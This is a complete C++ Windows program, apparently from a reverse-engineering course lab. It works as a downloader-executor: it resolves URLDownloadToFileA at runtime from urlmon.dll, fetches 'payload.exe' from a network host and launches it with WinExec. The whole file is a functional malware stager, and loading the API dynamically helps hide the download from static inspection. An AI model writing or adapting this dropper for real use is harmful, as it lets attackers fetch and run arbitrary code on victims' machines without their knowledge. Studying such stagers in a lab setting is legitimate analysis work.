#include <windows.h>
#include <iostream>

using namespace std;

typedef HRESULT(WINAPI* URLDownloadToFileA_t)(LPUNKNOWN pCaller, LPCSTR szURL, LPCSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);

int main()
{
    HMODULE hKernel32 = LoadLibraryA("urlmon.dll");
    URLDownloadToFileA_t pURLDownloadToFileA = (URLDownloadToFileA_t)GetProcAddress(hKernel32, "URLDownloadToFileA");

    //string url = "https://raw.githubusercontent.com/dedkuzmich/reverse2024/main/lab2/payload/payload.exe";
    string url = "http://192.168.1.5:2291/payload.exe";
    string filename = "payload.exe";
    HRESULT hr = pURLDownloadToFileA(NULL, url.c_str(), filename.c_str(), 0, NULL);
    if (hr == S_OK)
    {
        cout << "File downloaded successfully" << endl;
    }
    else
    {
        cout << "Failed to download file. HRESULT: " << hr << endl;
        return 3;
    }

    WinExec(filename.c_str(), 5);

    FreeLibrary(hKernel32);
    return 0;
}
